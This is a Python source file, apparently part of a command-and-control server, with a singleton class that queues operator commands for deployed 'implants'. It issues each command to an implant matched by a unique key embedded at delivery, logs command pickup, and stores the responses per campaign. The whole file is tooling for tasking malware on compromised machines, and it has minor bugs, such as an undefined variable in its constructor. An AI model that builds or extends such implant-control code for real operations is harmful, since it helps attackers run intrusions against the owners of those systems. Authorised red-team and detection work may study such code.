from Database import Database
class ImplantSingleton:
    class __OnlyOne:
        UID = None
        # -- REMOVE QUEUEDCOMMANDS
        QueuedCommands = []

        RegisteredCommands = {}

        CommandOutput = []
        # worth adding to the logging based on the commands issued here.
        # -- ON BOOT READ LOG FILE AND PULL UNPULLED COMMANDS

        def AddCommand(self, User, UniqueImplantKey,Command):
            # -- Add record to issue command table with username - time - command - UID
            # -- Implement the logging calls to ensure entries got to DB. and get recorded on pick up
            db.Register_ImplantCommand(User, UniqueImplantKey, Command)

        def IssueCommand(self,UIK=0):
            if UIK != 0:
                # -- Issue command based on unique implant identifiers (UIK)
                # -- UIK is embedded into the implant via Jinja on delivery.
                ImplantObj=db.Get_GeneratedImplantDataFromUIK(UIK)
                for implant in ImplantObj:
                    ImpLogs = db.Get_RegisteredImplantCommandsFromUIK(implant['unique_implant_id'])
                    tmpImpLogs = []
                    for x in ImpLogs:
                        if x.read_by_implant == 0:
                            tmpImpLogs.append(x)
                    if len(tmpImpLogs) != 0:
                        Entry = min(tmpImpLogs, key=lambda x: x.time)
                        if db.Register_ImplantCommandPickup(Entry.uik,Entry.log_entry,Entry.time):
                            return Entry.log_entry

            # -- Create a suitable null response.
            # --    This may be a random value, depending on how the implant handles it.
                return "=="
            else:
                return "=="
        def CommandResponse(self,result):
            aa = result.split("::", 1)
            db.Register_ImplantResponse(aa[0],aa[1])
            # -- Legacy Format Below: To remove -- #
            # self.CommandOutput.append(result)
            return 0

        def Get_CommandResult(self,cid):
            # -- This trust any calls have already been authenticated/
            # --    May need to move authentication to this level.
            return db.Get_CampaignImplantResponses(cid)

    instance = None
    def __init__(self):
        if not ImplantSingleton.instance:
            ImplantSingleton.instance = ImplantSingleton.__OnlyOne()
        else:
            ImplantSingleton.instance.val = arg

db = Database()
x = ImplantSingleton()

